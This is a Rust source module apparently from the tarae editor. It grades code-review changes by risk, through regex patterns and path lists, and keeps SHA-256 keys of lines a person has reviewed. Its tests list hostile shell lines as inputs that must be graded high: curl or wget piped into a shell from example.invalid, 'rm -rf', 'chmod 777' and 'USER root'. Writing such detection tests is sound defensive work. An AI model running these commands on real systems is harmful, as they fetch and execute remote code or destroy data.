//! Risk grades — tarae's rules, never a model's: each change (hunk) of a code review is high, behaviour or
//! quiet. A high one is looked at by a person (`space v h` on it, in review mode) before the review ends or
//! the session is brought (`codereview.rs`, `worktree.rs`).
//!
//! - The engine is the core's and language-neutral; what counts is data:
//!   - each language pack's `[review]`: `risky` — line patterns that make a change high (`unsafe`,
//!     `Command::new` …), matched on the lines added *and* removed (taking a check out is a risk too);
//!     `quiet` — paths that are tests or docs (`Reach::Added`: a runtime folder's pack adds, never takes out);
//!   - the project's `review.risky` (paths, trusted — read from the checkout tarae started in, never from a
//!     session's own `.tarae.toml`, which its author could change) and `review.quiet`;
//!   - the protected names every pack lists (`sandbox::protected_names`: build scripts, manifests …).
//! - High wins over everything — a test that deletes is still high (a fixture's `rm -rf /` ran once). Quiet:
//!   a quiet path, a change wholly inside a test (the pack's `tests.scm` on the document's tree), or one that
//!   only moves whitespace. Behaviour otherwise — and whenever nothing can tell.
//! - "Looked at" is kept per changed line — (path, `+`/`-`, text), keyed by SHA-256 (`key`: no key one can
//!   make collide with a line looked at) — so a change looked at before it was committed still counts in the
//!   commits a bring takes, and a line changed since is a line not looked at. The key has no position, on
//!   purpose (regrouped, a change must still count): the same line added again elsewhere in the same file, by
//!   the same sign, counts as looked at already. A change of mode is keyed by its modes (sign `m`).
//! - A change partly looked at waits only for its lines not looked at (`Graded::left`): a fix of five lines in
//!   a change of a thousand asks for those five (cardburden 1).
//! - A line taken out since it was looked at (`taken_out`): an added line a person looked at that the file has
//!   fewer of than then (counted in its whole text: one committed since is still there; one taken out beside a
//!   copy that stays is one fewer) is a change of its own to look at (sign `x`) — taking out a check that
//!   stood beside an `unsafe` made no new key, and the change stayed "looked at".
//! - A line moved within its change since it was looked at (`moved`, `out_of_order`): the same keys in
//!   another order — a check moved after the call it guarded — is a change of its own to look at (sign `o`).

use std::collections::HashSet;
use std::ops::Range;
use std::path::Path;
use std::sync::Arc;

use crate::config::EditorConfig;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Grade {
    /// Docs, tests, snapshots, formatting.
    Quiet,
    Behaviour,
    /// Looked at by a person before the review ends or the session is brought.
    High,
}

impl Grade {
    pub fn word(self) -> &'static str {
        match self {
            Grade::Quiet => "quiet",
            Grade::Behaviour => "behaviour",
            Grade::High => "high",
        }
    }
}

/// One language pack's rules (`packs::review`), its patterns compiled.
#[derive(Clone, Debug)]
struct Pack {
    name: String,
    langs: Vec<String>,
    risky: Vec<regex::Regex>,
    quiet: Vec<String>,
}

/// A pack's rules as tests write them: (pack, languages, patterns, quiet paths).
#[cfg(test)]
pub type TestPack<'a> = (&'a str, &'a [&'a str], &'a [&'a str], &'a [&'a str]);

/// Everything a grade is decided by: the packs' rules and the project's.
#[derive(Clone, Debug, Default)]
pub struct Rules {
    packs: Arc<Vec<Pack>>,
    /// The project's `review.risky` and `review.quiet` (paths).
    risky: Vec<String>,
    quiet: Vec<String>,
}

/// The packs' rules, read and compiled once. A pattern that doesn't compile is a mistake in its pack: logged
/// and left out (`every_packs_review_rules_compile` keeps tarae's own right).
fn packs() -> Arc<Vec<Pack>> {
    static READ: std::sync::OnceLock<Arc<Vec<Pack>>> = std::sync::OnceLock::new();
    READ.get_or_init(|| {
        let mut out = Vec::new();
        for r in crate::packs::review() {
            let mut risky = Vec::new();
            for p in &r.risky {
                match regex::Regex::new(p) {
                    Ok(re) => risky.push(re),
                    Err(e) => crate::log::line(
                        "tarae",
                        "warning",
                        &format!("the {} pack: [review] risky `{p}`: {e}", r.pack),
                    ),
                }
            }
            out.push(Pack { name: r.pack, langs: r.langs, risky, quiet: r.quiet });
        }
        Arc::new(out)
    })
    .clone()
}

impl Rules {
    /// The rules in effect: every pack's, and the project's from `cfg` — the editor's, read in the checkout
    /// tarae started in (a session's own `.tarae.toml` is never read for them).
    pub fn of(cfg: &EditorConfig) -> Rules {
        Rules { packs: packs(), risky: cfg.review_risky.clone(), quiet: cfg.review_quiet.clone() }
    }

    /// Rules with these packs' (pack, languages, patterns, quiet paths) and the project's lists (tests).
    #[cfg(test)]
    pub fn with(packs: &[TestPack], risky: &[&str], quiet: &[&str]) -> Rules {
        let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        let packs = packs
            .iter()
            .map(|(name, langs, risky, quiet)| Pack {
                name: name.to_string(),
                langs: s(langs),
                risky: risky.iter().map(|p| regex::Regex::new(p).unwrap()).collect(),
                quiet: s(quiet),
            })
            .collect();
        Rules { packs: Arc::new(packs), risky: s(risky), quiet: s(quiet) }
    }

    fn packs_of<'a>(&'a self, lang: Option<&'a str>) -> impl Iterator<Item = &'a Pack> {
        self.packs.iter().filter(move |p| lang.is_some_and(|l| p.langs.iter().any(|x| x == l)))
    }
}

/// One change: where it is (the first of its lines now, 0-based — for lines only removed, the line they were
/// before) and the lines it removed and added.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Hunk {
    pub at: usize,
    pub removed: Vec<String>,
    pub added: Vec<String>,
    /// A change of mode instead of lines — (old, new), `none` for a file that wasn't there: made executable
    /// (`100755`) or a symlink (`120000`), the only ones `mode_change` gives.
    pub mode: Option<(String, String)>,
}

/// A change graded: its grade, why (the rule and whose: `unsafe (rust pack)`), where, and its lines' keys.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Graded {
    pub grade: Grade,
    pub why: String,
    pub at: usize,
    /// How many lines it spans now (at least 1 — a deletion's place).
    pub lines: usize,
    /// Its lines' keys: the removed ones, then the added ones, then a change of mode's (`keys`).
    pub keys: Vec<Key>,
    /// How many of `keys` are removed lines, and added ones.
    pub removed: usize,
    pub added: usize,
    /// A change of mode (`Hunk.mode`), not of lines — an open document's diff doesn't have it.
    pub mode: bool,
}

impl Graded {
    /// Whether a person looked at every line of it (`looked`: the session's keys — `space v h`).
    pub fn looked_at(&self, looked: &HashSet<Key>) -> bool {
        self.keys.iter().all(|k| looked.contains(k))
    }

    /// The lines (0-based, now) of it no one has looked at, in order, each once: an added line where it is; a
    /// removed line, or a change of mode, at the change's first line (where its removed rows are drawn).
    pub fn left(&self, looked: &HashSet<Key>) -> Vec<usize> {
        self.left_by(|k| looked.contains(k))
    }

    /// `left`, by whatever counts as seen (`seen`: a viewed mark's keys, or the looked at ones).
    pub fn left_by(&self, seen: impl Fn(&Key) -> bool) -> Vec<usize> {
        let mut out: Vec<usize> = self
            .keys
            .iter()
            .enumerate()
            .filter(|(_, k)| !seen(k))
            .map(|(i, _)| match i.checked_sub(self.removed) {
                Some(a) if a < self.added => self.at + a,
                _ => self.at,
            })
            .collect();
        out.sort_unstable();
        out.dedup();
        out
    }
}

/// The language a file is, by its path (as the editor picks it).
pub fn lang_of(rel: &str) -> Option<&'static str> {
    crate::syntax::detect(Path::new(rel)).map(|s| s.name.as_str())
}

/// Hunk `h` of file `rel` (from the repository's root; `lang` its language) graded by `rules`; `in_test`: it
/// lies wholly inside a test (the document's tree says).
pub fn grade(rel: &str, lang: Option<&str>, h: &Hunk, rules: &Rules, in_test: bool) -> (Grade, String) {
    // (a permission: `mode_change` gives only the modes that matter)
    if let Some((_, new)) = &h.mode {
        let what = if new == "120000" { "now a symlink" } else { "now executable" };
        return (Grade::High, what.into());
    }
    if let Some(e) = rules.risky.iter().find(|e| path_matches(rel, e)) {
        return (Grade::High, format!("{} (.tarae.toml)", e.trim()));
    }
    let parts: Vec<&std::ffi::OsStr> = Path::new(rel).iter().collect();
    if let Some(&i) = crate::sandbox::protected_at(&parts).first() {
        return (Grade::High, format!("{} (protected)", parts[i].to_string_lossy()));
    }
    for p in rules.packs_of(lang) {
        for line in h.removed.iter().chain(&h.added) {
            if let Some(m) = p.risky.iter().find_map(|re| re.find(line)) {
                return (Grade::High, format!("{} ({} pack)", m.as_str().trim(), p.name));
            }
        }
    }
    if let Some(e) = rules.quiet.iter().find(|e| path_matches(rel, e)) {
        return (Grade::Quiet, format!("{} (.tarae.toml)", e.trim()));
    }
    if let Some((e, p)) =
        rules.packs_of(lang).find_map(|p| Some((p.quiet.iter().find(|e| path_matches(rel, e))?, p)))
    {
        return (Grade::Quiet, format!("{} ({} pack)", e.trim(), p.name));
    }
    if in_test {
        return (Grade::Quiet, "a test".into());
    }
    let bare =
        |v: &[String]| v.iter().flat_map(|l| l.chars()).filter(|c| !c.is_whitespace()).collect::<String>();
    if bare(&h.removed) == bare(&h.added) {
        return (Grade::Quiet, "formatting".into());
    }
    (Grade::Behaviour, String::new())
}

/// `h` of `rel` graded, with its keys.
pub fn graded(rel: &str, lang: Option<&str>, h: &Hunk, rules: &Rules, in_test: bool) -> Graded {
    let (grade, why) = grade(rel, lang, h, rules, in_test);
    Graded {
        grade,
        why,
        at: h.at,
        lines: h.added.len().max(1),
        keys: keys(rel, h),
        removed: h.removed.len(),
        added: h.added.len(),
        mode: h.mode.is_some(),
    }
}

/// The added lines of `rel` a person looked at that the file has fewer of now (`gone`: each text as it was,
/// and how many times the file has it now), at `at` — where they were when looked at: a high-risk change of
/// its own, keyed by each text and that count (`taken_out_key`). Looked at, it's done; another copy taken
/// out later is a new count, asked again.
pub fn taken_out(rel: &str, at: usize, gone: &[(&str, u32)]) -> Graded {
    let shown: String = gone.first().map(|t| t.0.trim()).unwrap_or_default().chars().take(60).collect();
    let more = match gone.len() {
        0 | 1 => String::new(),
        n => format!(" and {} more", n - 1),
    };
    Graded {
        grade: Grade::High,
        why: format!("taken out since your look: `{shown}`{more}"),
        at,
        lines: 1,
        keys: gone.iter().map(|(t, now)| taken_out_key(rel, t, *now)).collect(),
        removed: 0,
        added: 0,
        mode: false,
    }
}

/// The key of a line of `rel` taken out since it was looked at, the file having it `now` times (sign `x`).
pub fn taken_out_key(rel: &str, text: &str, now: u32) -> Key {
    key(rel, b'x', &format!("{now}\0{text}"))
}

/// A line of `rel` (its key `line`) that moved within its change since it was looked at — between the lines
/// `prev` and `next` now (none: the change's end): a high-risk change of its own at `at` (its line now).
/// Keyed by the line and its new neighbours (sign `o`): looked at there, it's done; moved again, it's asked
/// again. `text`: the line, when its document is open.
pub fn moved(
    rel: &str,
    at: usize,
    text: Option<&str>,
    (line, prev, next): (Key, Option<Key>, Option<Key>),
) -> Graded {
    let why = match text {
        Some(t) => format!("moved since your look: `{}`", t.trim().chars().take(60).collect::<String>()),
        None => "a line moved since your look".to_string(),
    };
    let around = format!("{}\0{}\0{}", key_hex(line), key_hex(prev.unwrap_or(0)), key_hex(next.unwrap_or(0)));
    Graded {
        grade: Grade::High,
        why,
        at,
        lines: 1,
        keys: vec![key(rel, b'o', &around)],
        removed: 0,
        added: 0,
        mode: false,
    }
}

/// One high-risk change looked at (`Session.looked_orders`): its added lines' keys in the order a person
/// looked at them — a line found out of that order since is a change to look at (`moved`) — and the lines just
/// above and below it then, its place: one of its lines missing since is counted between them as they're
/// found now (`codereview::taken_out_of` — a line the diff now pairs with another copy is still there).
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct LookedOrder {
    pub keys: Vec<Key>,
    pub above: Option<String>,
    pub below: Option<String>,
}

/// Of `now` (a change's added lines' keys, in order), the indices of those out of the order `then` had them
/// in: the lines of both, outside one longest run in `then`'s order — a line moved, not the ones around it.
pub fn out_of_order(then: &[Key], now: &[Key]) -> Vec<usize> {
    // (each line of both by its place in `then`: the first not taken yet — a repeated line, in turn)
    let mut places: std::collections::HashMap<Key, std::collections::VecDeque<usize>> = Default::default();
    for (p, k) in then.iter().enumerate() {
        places.entry(*k).or_default().push_back(p);
    }
    let placed: Vec<(usize, usize)> =
        now.iter().enumerate().filter_map(|(i, k)| Some((i, places.get_mut(k)?.pop_front()?))).collect();
    // (the longest increasing run of places — what stayed in order — in n log n: a change can be long)
    let mut tails: Vec<usize> = Vec::new();
    let mut from: Vec<Option<usize>> = vec![None; placed.len()];
    for (i, &(_, p)) in placed.iter().enumerate() {
        let at = tails.partition_point(|&t| placed[t].1 < p);
        from[i] = at.checked_sub(1).map(|a| tails[a]);
        match tails.get_mut(at) {
            Some(t) => *t = i,
            None => tails.push(i),
        }
    }
    let mut kept = vec![false; placed.len()];
    let mut at = tails.last().copied();
    while let Some(i) = at {
        kept[i] = true;
        at = from[i];
    }
    placed.iter().zip(kept).filter(|(_, k)| !k).map(|((i, _), _)| *i).collect()
}

/// Whether a line says nothing on its own — blank, or only brackets and punctuation (`}`, `)`, `];`, `},`):
/// not kept as looked at for "taken out" (one going would ask about nothing), still a line when added.
pub fn trivial(line: &str) -> bool {
    line.trim().chars().all(|c| c.is_ascii_punctuation())
}

/// An added line a person looked at (`Session.looked_lines`): where it was then, its text, its key as added
/// (`+`, the diff's), and how many times the file had that text then — fewer now, one was taken out.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct LookedLine {
    pub at: usize,
    pub text: String,
    pub added: Key,
    pub count: u32,
}

impl LookedLine {
    pub fn new(rel: &str, at: usize, text: &str, count: u32) -> LookedLine {
        LookedLine { at, text: text.to_string(), added: key(rel, b'+', text), count }
    }
}

/// A changed line's key (`keys`): the first 128 bits of a SHA-256 — a gate's mark, so not a hash one can
/// make collide (an FNV key let a harmless line looked at stand for a dangerous one written to match it).
pub type Key = u128;

/// What a line's key is the SHA-256 of: `KEY_TAG`, then the path, the sign (`+`/`-`) and the line's text,
/// each led by its length (8 bytes, big-endian) — so no two (path, sign, text) run together into the same bytes.
pub fn key_input(rel: &str, sign: u8, line: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(KEY_TAG.len() + rel.len() + line.len() + 33);
    for field in [KEY_TAG.as_bytes(), rel.as_bytes(), &[sign], line.as_bytes()] {
        out.extend((field.len() as u64).to_be_bytes());
        out.extend(field);
    }
    out
}

/// Names what the keys are (a change of encoding is a new tag: marks kept before stop matching).
const KEY_TAG: &str = "tarae review line v1";

/// The key of one changed line of `rel` (`sign` `+` added, `-` removed).
pub fn key(rel: &str, sign: u8, line: &str) -> Key {
    let d = crate::sha256::digest(&key_input(rel, sign, line));
    Key::from_be_bytes(d[..16].try_into().expect("16 of 32 bytes"))
}

/// Every changed line's key — kept (`Session.looked`, the restore file), the same in every build.
pub fn keys(rel: &str, h: &Hunk) -> Vec<Key> {
    let key = |sign: u8, line: &str| key(rel, sign, line);
    // (a change of mode: its modes, sign `m`)
    let mode = h.mode.iter().map(|(old, new)| key(b'm', &format!("{old} {new}")));
    h.removed.iter().map(|l| key(b'-', l)).chain(h.added.iter().map(|l| key(b'+', l))).chain(mode).collect()
}

/// A key as the restore file keeps it: 32 hex digits.
pub fn key_hex(k: Key) -> String {
    format!("{k:032x}")
}

/// A kept key back — None for anything else (a number: a mark of the FNV keys before, which counts for nothing).
pub fn key_of_hex(s: &str) -> Option<Key> {
    (s.len() == 32 && s.bytes().all(|b| b.is_ascii_hexdigit()))
        .then(|| Key::from_str_radix(s, 16).ok())
        .flatten()
}

/// Whether `entry` (a name — matching any part of the path, in any case — or a path from the root, with `/`;
/// one `*` per part, `sandbox*`) matches `rel`.
pub fn path_matches(rel: &str, entry: &str) -> bool {
    let entry = entry.trim().trim_start_matches("./").trim_end_matches('/');
    if entry.is_empty() {
        return false;
    }
    let parts: Vec<&str> = rel.split('/').filter(|p| !p.is_empty()).collect();
    match entry.contains('/') {
        true => {
            let want: Vec<&str> = entry.split('/').collect();
            want.len() <= parts.len() && want.iter().zip(&parts).all(|(w, p)| part_matches(w, p))
        }
        false => parts.iter().any(|p| part_matches(entry, p)),
    }
}

/// One part against a pattern with at most one `*`, in any case.
fn part_matches(pat: &str, part: &str) -> bool {
    let (pat, part) = (pat.to_lowercase(), part.to_lowercase());
    match pat.split_once('*') {
        None => pat == part,
        Some((a, b)) => part.len() >= a.len() + b.len() && part.starts_with(a) && part.ends_with(b),
    }
}

/// `base` → `now` as changes — **the one way** a file's text becomes changes, for a review (an open
/// document's diff, a file not opened yet) and a bring alike, so a line looked at in one is a line the other
/// knows (`codereview::highs_between`; 2026-10-07: git's own diff named a blank line removed that this one
/// kept, and the bring waited on a look nothing could give). Never git's diff: its algorithm and heuristics
/// are the user's config.
pub fn changes(base: &str, now: &str) -> Vec<Hunk> {
    let (b, n): (Vec<&str>, Vec<&str>) = (base.lines().collect(), now.lines().collect());
    let at = |v: &[&str], l: usize| v.get(l).map(|s| line_text(s).to_string());
    lines_of(|l| at(&b, l), |l| at(&n, l), &crate::git::hunks(base, now))
}

/// A line as a change has it: without its `\n`, nor a `\r` before that (as `str::lines` gives it) — the one
/// rule, whoever reads the line (`changes`, an open document's rope — `codereview::grade_doc`).
pub fn line_text(raw: &str) -> &str {
    let s = raw.strip_suffix('\n').unwrap_or(raw);
    s.strip_suffix('\r').unwrap_or(s)
}

/// `hunks` — `git::hunks(base, now)`, worked out already (an open document's, on a worker) — with their lines,
/// each read by `base`/`now` (line → its text by `line_text`; None past the end): only the changed lines are
/// read, so an open document isn't made a `String` for them.
pub fn lines_of(
    base: impl Fn(usize) -> Option<String>,
    now: impl Fn(usize) -> Option<String>,
    hunks: &[crate::git::Hunk],
) -> Vec<Hunk> {
    let take = |f: &dyn Fn(usize) -> Option<String>, r: &Range<usize>| r.clone().map_while(f).collect();
    hunks
        .iter()
        .map(|h| Hunk {
            at: h.lines.start,
            removed: take(&base, &h.base),
            added: take(&now, &h.lines),
            mode: None,
        })
        .collect()
}

/// A change of mode that matters (git's modes: `old`, `new`, `000000` for a file that wasn't there): made
/// executable, or a symlink — a change of its own; any other, none.
pub fn mode_change(old: &str, new: &str) -> Option<Hunk> {
    let old = if old.bytes().all(|b| b == b'0') { "none" } else { old };
    (matches!(new, "100755" | "120000") && old != new)
        .then(|| Hunk { mode: Some((old.to_string(), new.to_string())), ..Hunk::default() })
}

/// A binary file as one change — its blob (git's id of its content: the same in a review and in the commits a
/// bring takes) stands for its lines.
pub fn binary(blob: &str) -> Hunk {
    Hunk { at: 0, removed: Vec::new(), added: vec![format!("(binary {blob})")], mode: None }
}

/// The byte ranges of the tests in a document (the pack's `tests.scm` on its tree — `packs::Tests::test_spans`):
/// its language's pack compiled once per language.
pub fn test_spans(lang: &str, tree: &tree_sitter::Tree, src: &str) -> Vec<Range<usize>> {
    type Cache = std::collections::HashMap<String, Option<Arc<crate::packs::Tests>>>;
    static TESTS: std::sync::Mutex<Option<Cache>> = std::sync::Mutex::new(None);
    let tests = {
        let mut cache = TESTS.lock().unwrap_or_else(|e| e.into_inner());
        let cache = cache.get_or_insert_with(Default::default);
        cache
            .entry(lang.to_string())
            .or_insert_with(|| crate::packs::tests(lang, &tree.language()).and_then(Result::ok).map(Arc::new))
            .clone()
    };
    tests.map(|t| t.test_spans(tree, src)).unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn h(removed: &[&str], added: &[&str]) -> Hunk {
        let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect();
        Hunk { at: 0, removed: s(removed), added: s(added), mode: None }
    }

    /// The grades come from the data: a pack's line pattern and a project's path make a change high, the
    /// protected names too; quiet paths, a test, whitespace make it quiet — never over a high; the rest is
    /// behaviour.
    #[test]
    fn grades_come_from_pack_and_project_data() {
        let rules = Rules::with(
            &[
                ("rust", &["rust"], &[r"\bunsafe\b", r"remove_dir_all"], &["tests/"]),
                ("markdown", &["markdown"], &[], &["*.md"]),
            ],
            &["sandbox*", "src/landlock.rs"],
            &["src/snapshots/"],
        );
        let g = |rel: &str, hunk: &Hunk, in_test: bool| grade(rel, lang_of(rel), hunk, &rules, in_test);
        let plain = h(&["let a = 1;"], &["let a = 2;"]);
        assert_eq!(
            g("src/a.rs", &h(&[], &["unsafe { x() }"]), false),
            (Grade::High, "unsafe (rust pack)".into())
        );
        // (taking it out is a change to look at too)
        assert_eq!(g("src/a.rs", &h(&["fs::remove_dir_all(p)?;"], &[]), false).0, Grade::High);
        assert_eq!(g("src/sandbox/linux.rs", &plain, false), (Grade::High, "sandbox* (.tarae.toml)".into()));
        assert_eq!(g("src/landlock.rs", &plain, false).0, Grade::High);
        assert_eq!(g("deep/build.rs", &plain, false), (Grade::High, "build.rs (protected)".into()));
        // High wins over a test, a quiet path, formatting
        assert_eq!(g("src/a.rs", &h(&[], &["unsafe { x() }"]), true).0, Grade::High);
        assert_eq!(g("tests/e2e.rs", &h(&[], &["std::fs::remove_dir_all(&dir)"]), false).0, Grade::High);
        // Quiet
        assert_eq!(g("README.md", &plain, false), (Grade::Quiet, "*.md (markdown pack)".into()));
        assert_eq!(g("tests/e2e.rs", &plain, false), (Grade::Quiet, "tests/ (rust pack)".into()));
        assert_eq!(
            g("src/snapshots/x.txt", &plain, false),
            (Grade::Quiet, "src/snapshots/ (.tarae.toml)".into())
        );
        assert_eq!(g("src/a.rs", &plain, true), (Grade::Quiet, "a test".into()));
        assert_eq!(
            g("src/a.rs", &h(&["let a=1;"], &["let a = 1;"]), false),
            (Grade::Quiet, "formatting".into())
        );
        // The rest
        assert_eq!(g("src/a.rs", &plain, false), (Grade::Behaviour, String::new()));
        // A pack's patterns are its language's: `unsafe` in a Python file is just a word
        assert_eq!(g("tool.py", &h(&[], &["# unsafe here"]), false).0, Grade::Behaviour);
        // No rules of the project's: sandbox.rs is just code
        let packs_only = Rules { risky: Vec::new(), ..rules.clone() };
        assert_eq!(grade("src/sandbox.rs", Some("rust"), &plain, &packs_only, false).0, Grade::Behaviour);
    }

    /// A project's `review.risky` waits for trust (the trust card lists it — an untrusted checkout could
    /// otherwise lower its own gates by changing it); `review.quiet`, which can't lower a high, applies at once.
    #[test]
    fn a_projects_risky_paths_wait_for_trust() {
        use crate::trust::{State, Store};
        let path = crate::config::tests::project_file(
            "review-trust",
            "[review]\nrisky = [\"sandbox*\"]\nquiet = [\"src/snapshots/\"]\n",
        );
        let (c, _) = crate::config::load_from(None, Some(path.clone()), &Store::default());
        let p = c.project.as_ref().expect("a project file");
        assert_eq!(p.state, State::Ask);
        assert!(p.items.iter().any(|(k, _)| k == "review.risky"), "on the card: {:?}", p.items);
        assert!(c.editor.review_risky.is_empty(), "held back");
        assert_eq!(c.editor.review_quiet, ["src/snapshots/"]);
        let mut store = Store::default();
        store.answer(&path, p.hash, true);
        let (t, _) = crate::config::load_from(None, Some(path.clone()), &store);
        assert_eq!(t.editor.review_risky, ["sandbox*"], "trusted");
        std::fs::remove_dir_all(path.parent().unwrap()).ok();
    }

    /// A runtime folder's pack adds to the built-in `[review]` and can't take one of its patterns out
    /// (`Reach::Added`): an empty list of one's own leaves them.
    #[test]
    fn a_packs_own_review_adds_and_never_takes_out() {
        let builtin = "[language.rust]\nextensions = [\"rs\"]\n[review]\nrisky = ['\\bunsafe\\b']\nquiet = [\"tests/\"]\n";
        let list = |t: &toml::Table, k: &str| -> Vec<String> {
            t["review"][k].as_array().unwrap().iter().map(|v| v.as_str().unwrap().to_string()).collect()
        };
        let mine = "[review]\nrisky = ['danger_zone']\n";
        let t = crate::packs::merged("rust", Some(builtin.into()), Some(mine.into())).unwrap().unwrap();
        assert_eq!(list(&t, "risky"), [r"\bunsafe\b", "danger_zone"]);
        let empty = "[review]\nrisky = []\nquiet = []\n";
        let t = crate::packs::merged("rust", Some(builtin.into()), Some(empty.into())).unwrap().unwrap();
        assert_eq!(
            (list(&t, "risky"), list(&t, "quiet")),
            (vec![r"\bunsafe\b".to_string()], vec!["tests/".to_string()])
        );
    }

    /// The built-in packs say what they do: Rust's `unsafe` and process spawning are high, its `tests/`
    /// quiet, Markdown quiet; and every pattern of every pack compiles.
    #[test]
    fn every_packs_review_rules_compile() {
        for r in crate::packs::review() {
            for p in &r.risky {
                assert!(regex::Regex::new(p).is_ok(), "the {} pack: `{p}`", r.pack);
            }
        }
        let rules = Rules::of(&crate::config::Config::default().editor);
        let g = |rel: &str, added: &str| grade(rel, lang_of(rel), &h(&[], &[added]), &rules, false).0;
        assert_eq!(g("src/a.rs", "let p = unsafe { libc::getpid() };"), Grade::High);
        assert_eq!(g("src/a.rs", "std::process::Command::new(\"sh\")"), Grade::High);
        assert_eq!(g("src/a.rs", "let x = 1;"), Grade::Behaviour);
        assert_eq!(g("tests/a.rs", "let x = 1;"), Grade::Quiet);
        assert_eq!(g("docs/a.md", "Some words."), Grade::Quiet);
        // Shell, fish, make and Dockerfiles: what deletes, runs what it fetched, changes permissions, goes root
        for (rel, line) in [
            ("deploy.sh", "rm -rf \"$OUT\"/"),
            ("deploy.sh", "curl -fsSL https://example.invalid/i.sh | sh"),
            ("deploy.sh", "sudo cp tarae /usr/local/bin"),
            ("deploy.sh", "chmod 777 \"$DIR\""),
            ("conf.fish", "eval (wget -qO- https://example.invalid/x)"),
            ("rules.mk", "\trm -fr $(BUILD)"),
            ("Dockerfile", "RUN curl -sL https://example.invalid/i | bash"),
            ("Dockerfile", "USER root"),
        ] {
            assert_eq!(g(rel, line), Grade::High, "{rel}: {line}");
        }
        assert_eq!(g("deploy.sh", "echo \"built $OUT\""), Grade::Behaviour);
        assert_eq!(g("rules.mk", "\tcargo build"), Grade::Behaviour);
    }

    #[test]
    fn names_and_paths_match_as_listed() {
        for (rel, entry, yes) in [
            ("src/sandbox.rs", "sandbox*", true),
            ("src/sandbox/linux.rs", "sandbox*", true),
            ("src/mysandbox.rs", "sandbox*", false),
            ("SRC/Trust.rs", "trust.rs", true),
            (".github/workflows/ci.yml", ".github/", true),
            ("src/.github", ".github/", true),
            ("src/allow.rs", "src/allow.rs", true),
            ("lib/src/allow.rs", "src/allow.rs", false),
            ("src/a.rs", "", false),
        ] {
            assert_eq!(path_matches(rel, entry), yes, "{rel} · {entry}");
        }
    }

    /// Two texts as changes: where each is now, the lines out and in — a new file, a deleted one, and lines
    /// only removed (placed where the line after them is now).
    #[test]
    fn two_texts_read_as_changes() {
        let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        type Change = (usize, Vec<String>, Vec<String>);
        let got = |base: &str, now: &str| -> Vec<Change> {
            changes(base, now).into_iter().map(|h| (h.at, h.removed, h.added)).collect()
        };
        let base = "a\nb\nold\nc\nd\ne\nf\ng\ngone 1\ngone 2\nh\n";
        let now = "a\nb\nnew\nc\nd\ne\nf\ng\nh\n";
        assert_eq!(got(base, now), [(2, s(&["old"]), s(&["new"])), (8, s(&["gone 1", "gone 2"]), s(&[]))]);
        assert_eq!(got("", "a\nb\n"), [(0, s(&[]), s(&["a", "b"]))], "a new file");
        assert_eq!(got("x\n", ""), [(0, s(&["x"]), s(&[]))], "a deleted one");
        // (lines as `str::lines` has them: a CRLF file's `\r` isn't part of a line, a last line without `\n` is one)
        assert_eq!(got("a\r\nb\r\n", "a\r\nc"), [(1, s(&["b"]), s(&["c"]))]);
    }

    /// A change of mode has no lines: made executable, or made a symlink, it's a change of its own — high, its
    /// key its path and its modes; any other mode change (or a deleted file's) isn't one.
    #[test]
    fn a_file_made_executable_or_a_symlink_is_a_high_change() {
        let m = |o: &str, n: &str| Some((o.to_string(), n.to_string()));
        let mode = |o: &str, n: &str| mode_change(o, n).and_then(|h| h.mode);
        assert_eq!(mode("100644", "100755"), m("100644", "100755"));
        assert_eq!(mode("000000", "100755"), m("none", "100755"), "a new executable file");
        assert_eq!(mode("100644", "120000"), m("100644", "120000"), "a symlink in a file's place");
        assert_eq!(mode("000000", "120000"), m("none", "120000"));
        for (o, n) in [("100755", "100644"), ("100644", "000000"), ("100755", "100755"), ("000000", "100644")]
        {
            assert_eq!(mode(o, n), None, "{o} → {n}");
        }
        // Graded high, keyed by its modes
        let exec = Hunk { mode: m("100644", "100755"), ..Hunk::default() };
        let rules = Rules::default();
        assert_eq!(grade("run.sh", None, &exec, &rules, false), (Grade::High, "now executable".into()));
        let link = Hunk { mode: m("none", "120000"), ..Hunk::default() };
        assert_eq!(grade("l", None, &link, &rules, false), (Grade::High, "now a symlink".into()));
        let g = graded("run.sh", None, &exec, &rules, false);
        assert_eq!((g.keys.clone(), g.mode), (vec![key("run.sh", b'm', "100644 100755")], true));
    }

    /// A line's key is the SHA-256 (its first 128 bits) of the tag, the path, the sign and the text, each led by
    /// its length — written out here byte by byte, apart from `key_input`; fields can't run into each other, and
    /// a key kept as hex comes back as itself.
    #[test]
    fn a_lines_key_is_the_sha256_of_its_encoding() {
        let field = |b: &[u8]| [(b.len() as u64).to_be_bytes().as_slice(), b].concat();
        let bytes =
            [field(b"tarae review line v1"), field(b"src/a.rs"), field(b"+"), field(b"    unsafe { b() }")]
                .concat();
        let want = &crate::sha256::hex(&bytes)[..32];
        let k = key("src/a.rs", b'+', "    unsafe { b() }");
        assert_eq!(key_hex(k), want);
        assert_eq!(keys("src/a.rs", &h(&[], &["    unsafe { b() }"])), [k]);
        // (no length prefixes, these would be the same bytes)
        assert_ne!(key("src/a", b'+', ".rsx"), key("src/a.rs", b'+', "x"));
        assert_ne!(key("a.rs", b'+', "x"), key("a.rs", b'-', "x"));
        assert_eq!(key_of_hex(&key_hex(k)), Some(k));
        assert_eq!(key_of_hex("12387807294418380025"), None, "an FNV key kept before");
    }

    /// Looked at is per line: the same lines regrouped still count; a line changed since doesn't.
    #[test]
    fn looked_at_is_kept_per_line() {
        let a = h(&["old"], &["unsafe { a() }", "b()"]);
        let looked: HashSet<Key> = keys("src/a.rs", &a).into_iter().collect();
        let g = |hunk: &Hunk| Graded {
            grade: Grade::High,
            why: String::new(),
            at: 0,
            lines: 1,
            keys: keys("src/a.rs", hunk),
            removed: hunk.removed.len(),
            added: hunk.added.len(),
            mode: false,
        };
        assert!(g(&h(&[], &["unsafe { a() }"])).looked_at(&looked), "a part of it, regrouped");
        assert!(!g(&h(&["old"], &["unsafe { a2() }", "b()"])).looked_at(&looked), "a line changed since");
        assert!(!graded("src/b.rs", None, &a, &Rules::default(), false).looked_at(&looked), "another file");
    }
}
